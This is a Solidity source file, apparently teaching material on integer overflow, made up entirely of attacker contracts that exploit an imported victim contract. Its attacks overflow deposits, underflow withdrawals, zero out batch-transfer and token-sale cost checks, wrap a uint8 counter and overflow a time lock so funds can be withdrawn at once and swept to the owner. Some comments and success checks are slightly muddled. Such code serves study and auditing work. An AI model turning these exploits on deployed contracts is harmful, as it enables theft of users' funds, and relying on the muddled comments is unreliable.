// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./SC08_Integer_Overflow_Victim.sol";

/*
 SC08_Integer_Overflow_Attacker.sol
 Purpose: Demonstrates exploitation of Integer Overflow and Underflow vulnerabilities.
 
 Attack Techniques:
 1. Overflow Attack: Exploit addition overflow to get huge balance from small amount
 2. Underflow Attack: Exploit subtraction underflow to get max balance from zero
 3. Batch Transfer Overflow: Bypass balance check with overflow
 4. Time Lock Bypass: Overflow timestamp to unlock funds immediately
*/

contract IntegerOverflowAttacker {
    IntegerOverflowVictim public victim;
    address public owner;
    
    event AttackExecuted(string attackType, bool success);
    event BalanceChanged(uint256 balanceBefore, uint256 balanceAfter);
    
    constructor(address _victim) {
        victim = IntegerOverflowVictim(_victim);
        owner = msg.sender;
    }
    
    // ATTACK 1: Overflow Attack on Deposit
    // Exploit: Add large amount to cause overflow
    function attackOverflowDeposit() external {
        uint256 balanceBefore = victim.balances(address(this));
        
        // Get max uint256 value
        uint256 maxUint = type(uint256).max;
        
        // If we have some balance, adding (maxUint - balance + 1) will overflow to 0
        // Then adding more will give us any desired amount
        if (balanceBefore > 0) {
            // Calculate overflow amount
            uint256 overflowAmount = maxUint - balanceBefore + 100;
            
            // This will overflow: balanceBefore + overflowAmount wraps around
            victim.vulnerableDeposit(overflowAmount);
        }
        
        uint256 balanceAfter = victim.balances(address(this));
        
        emit BalanceChanged(balanceBefore, balanceAfter);
        emit AttackExecuted("Overflow Deposit Attack", balanceAfter < balanceBefore);
    }
    
    // ATTACK 2: Underflow Attack on Withdraw
    // Exploit: Withdraw more than balance to cause underflow
    function attackUnderflowWithdraw() external {
        uint256 balanceBefore = victim.balances(address(this));
        
        // Try to withdraw more than we have
        // If balance = 0, withdrawing 1 will underflow to max uint256
        uint256 withdrawAmount = balanceBefore + 1;
        
        victim.vulnerableWithdraw(withdrawAmount);
        
        uint256 balanceAfter = victim.balances(address(this));
        
        emit BalanceChanged(balanceBefore, balanceAfter);
        emit AttackExecuted("Underflow Withdraw Attack", balanceAfter > balanceBefore);
    }
    
    // ATTACK 3: Batch Transfer Overflow
    // Exploit: Create many recipients so length * amount overflows
    function attackBatchTransferOverflow() external {
        // First, get some tokens
        victim.vulnerableDeposit(1000 * 10**18);
        
        uint256 balanceBefore = victim.balances(address(this));
        
        // Create recipients array
        // We want: recipients.length * amount to overflow
        // Example: if amount = 2^255, and length = 2, then 2 * 2^255 = 2^256 (overflow to 0)
        
        uint256 amount = 2**255;  // Large amount
        
        address[] memory recipients = new address[](2);
        recipients[0] = address(0x1);
        recipients[1] = address(0x2);
        
        // recipients.length * amount = 2 * 2^255 = 2^256 = 0 (overflow!)
        // So totalNeeded = 0, but we actually transfer 2 * amount
        victim.vulnerableBatchTransfer(recipients, amount);
        
        uint256 balanceAfter = victim.balances(address(this));
        
        emit BalanceChanged(balanceBefore, balanceAfter);
        emit AttackExecuted("Batch Transfer Overflow Attack", true);
    }
    
    // ATTACK 4: Multiplication Overflow
    // Exploit: Multiply large numbers to cause overflow
    function attackMultiplicationOverflow() external returns (uint256) {
        uint256 a = 2**255;
        uint256 b = 2;
        
        // This will overflow: 2^255 * 2 = 2^256 = 0
        uint256 result = victim.vulnerableMultiply(a, b);
        
        emit AttackExecuted("Multiplication Overflow Attack", result == 0);
        
        return result;
    }
    
    // ATTACK 5: Small Type Overflow
    // Exploit: Increment uint8 past 255
    function attackSmallTypeOverflow() external {
        // Keep incrementing until overflow
        for (uint256 i = 0; i < 256; i++) {
            victim.vulnerableIncrementSmall();
        }
        
        uint8 value = victim.smallValue();
        
        // After 256 increments, value should have overflowed back to 0
        emit AttackExecuted("Small Type Overflow Attack", value < 10);
    }
    
    // ATTACK 6: Token Sale Overflow
    // Exploit: Buy tokens with overflowed price
    function attackTokenSaleOverflow() external payable {
        // Price per token: 1 ether
        // If we want 2^256 tokens, cost = 2^256 * 1 ether = 0 (overflow!)
        
        // But we can't use 2^256 directly (too large)
        // Use calculation that will overflow to small number
        
        uint256 tokenAmount = type(uint256).max / 1 ether + 1;
        // cost = tokenAmount * 1 ether will overflow to small number
        
        // Send small amount of ether but get huge tokens (if contract allows)
        victim.vulnerableBuyTokens{value: msg.value}(tokenAmount);
        
        emit AttackExecuted("Token Sale Overflow Attack", true);
    }
    
    // Helper: Get victim balance of this contract
    function getVictimBalance() external view returns (uint256) {
        return victim.balances(address(this));
    }
    
    // Helper: Receive ETH
    receive() external payable {}
}

// Attacker for TimeLock bypass
contract TimeLockAttacker {
    TimeLockVictim public victim;
    address public owner;
    
    event AttackExecuted(string message, uint256 unlockTime);
    
    constructor(address _victim) {
        victim = TimeLockVictim(_victim);
        owner = msg.sender;
    }
    
    // ATTACK: Overflow timestamp to bypass lock
    function attackTimeLockOverflow() external payable {
        require(msg.value > 0, "Need ETH to deposit");
        
        // Calculate overflow amount
        // We want: block.timestamp + lockDuration to overflow to small value
        // max uint256 = 2^256 - 1
        // If lockDuration = (2^256 - 1) - block.timestamp + 1, it overflows to 0
        
        uint256 currentTime = block.timestamp;
        uint256 maxUint = type(uint256).max;
        
        // This will cause overflow: currentTime + overflowDuration wraps to 0 or 1
        uint256 overflowDuration = maxUint - currentTime + 1;
        
        // Deposit with overflow duration
        victim.deposit{value: msg.value}(overflowDuration);
        
        uint256 unlockTime = victim.lockTime(address(this));
        
        emit AttackExecuted("Time lock overflowed", unlockTime);
        
        // Now we can withdraw immediately because unlockTime overflowed to small value
        if (unlockTime <= block.timestamp) {
            victim.withdraw();
        }
    }
    
    // Withdraw funds
    function withdrawFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
